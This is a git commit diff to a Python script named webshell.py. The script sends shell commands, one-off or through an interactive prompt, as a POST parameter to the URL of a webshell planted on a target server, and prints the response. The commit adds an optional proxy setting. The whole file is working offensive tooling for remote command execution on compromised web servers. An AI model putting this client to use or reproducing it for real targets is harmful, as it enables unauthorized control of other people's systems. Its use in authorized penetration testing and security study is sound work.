d70563445f59acdf37064dbc03519122561b7056
neuronaddict <22725031+NeuronAddict@users.noreply.github.com>
2021-03-28 16:18:30 +0200

    add proxy to webshell

--- webshell.py
+++ webshell.py
@@ -5,12 +5,12 @@ import argparse
 import html2text
 import sys
 
-
 parser = argparse.ArgumentParser('get a webshell with url, and use <param> as command post param (by default cmd)')
 parser.add_argument('--header', action='append', help='add header')
 parser.add_argument('--param', default='cmd', help='param with command to use')
 parser.add_argument('--cmd', help='command to send')
 parser.add_argument('--html2text', action='store_true', help='print html on text mode')
+parser.add_argument('--proxy', help='use a proxy')
 parser.add_argument('url')
 
 args = parser.parse_args()
@@ -20,13 +20,15 @@ param = args.param
 cmd = args.cmd
 
 
+def execute(cmd, headers, h2t, proxy=None):
 
+    session = requests.session()
 
+    if proxy:
+        session.proxies = {'http': proxy, 'https': proxy}
 
-def execute(cmd, headers, h2t):
-	
-    r = requests.post(url, data={param: cmd}, headers=headers)
- 
+    r = session.post(url, data={param: cmd}, headers=headers)
+
     print(r.request.url)
 
     t = r.text
@@ -39,15 +41,12 @@ headers = {}
 if args.header:
     for header in args.header:
         key = header.split(':')[0]
-        value = header[header.index(': ')+2:]
+        value = header[header.index(': ') + 2:]
         headers[key] = value
 
 if cmd is not None:
-    execute(cmd, headers, args.html2text)
-else:	
+    execute(cmd, headers, args.html2text, args.proxy)
+else:
     while True:
         c = input('--> ')
         execute(c, headers, args.html2text)
-    
-
-
